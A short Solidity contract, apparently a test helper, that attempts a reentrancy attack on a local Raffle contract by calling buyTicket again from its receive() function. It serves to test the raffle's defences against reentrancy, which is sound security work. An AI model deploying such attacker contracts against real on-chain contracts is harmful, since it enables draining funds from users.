// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Raffle} from "../Raffle.sol";

contract ReentrancyAttacker {
    Raffle public raffle;
    uint256 public entranceFee;

    constructor(address _raffle) {
        raffle = Raffle(_raffle);
        entranceFee = raffle.getEntranceFee();
    }

    function attack() external payable {
        raffle.buyTicket{value: entranceFee}();
    }

    receive() external payable {
        // Try to re-enter
        raffle.buyTicket{value: entranceFee}();
    }
}
